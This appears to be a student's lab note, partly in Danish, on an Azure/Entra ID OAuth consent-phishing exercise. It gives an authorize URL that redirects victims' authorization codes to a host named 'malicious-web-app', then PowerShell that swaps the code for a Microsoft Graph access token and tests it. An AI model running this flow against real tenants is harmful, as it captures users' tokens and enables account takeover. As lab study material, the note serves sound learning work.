sad med mere OAuth
Det lykkedes mig at få scp: på cookien ved at først hente Authkoden i URL

Når en user authenticater i Azure bliver den sendt i urL'en specifikt på denne side


philip viste mig siden https://aadinternals.com/aadinternals/ som har en masse information om Entra ID og OAuth2.0

use this link https://login.microsoftonline.com/5dc7e152-c906-4d95-bd1a-bcf75eb3e939/oauth2/v2.0/authorize?client_id=675c27b6-e1ff-4a2c-924e-701186f97951&response_type=code&redirect_uri=https://malicious-web-app.azurewebsites.net/.auth/login/aad/callback&scope=User.ReadWrite&response_mode=query&prompt=consent
to get a auth prompt:
![[Dag 5 url image.png|200]]
the 2nd request has the code and the host is.
(press accept)
*if you don't see the code=, try again in a private browser*
![[gettingth eAuth Code.png]]
the Auth-Code lasts 10 minutes

to exchange the Auth-Code to an access token use this form
```bash
$authCode = "<PASTE_AUTH_CODE_HERE>"
$redirectUri = "<YOUR_REDIRECT_URI>"
$clientId = "<YOUR_CLIENT_ID>"
$clientSecret = "<YOUR_CLIENT_SECRET>"
$tenantId = "<YOUR_TENANT_ID>"

$body = @{
    client_id     = $clientId
    client_secret = $clientSecret
    code          = $authCode
    redirect_uri  = $redirectUri
    grant_type    = "authorization_code"
    scope         = "User.ReadWrite"
}

$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" `
    -Method Post `
    -ContentType "application/x-www-form-urlencoded" `
    -Body $body

Write-Output "Access Token: $($response.access_token)"
```
it may give an error but should also give you the Access Token (which last 1 hour)

Test the Token
```bash
$accessToken = "<Paste_Access_Token_Here>"
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers @{ Authorization = "Bearer $accessToken" }

```



The way you add more permissions to your app is here
<mark style="background: #FF5582A6;">Path: Entra ID/App registrations/"App"/API permissions </mark>
![[Dag 5.png|250]]
<mark style="background: #ADCCFFA6;">This is the Azure API that controls everything under that permission, in this case user.xyz</mark>



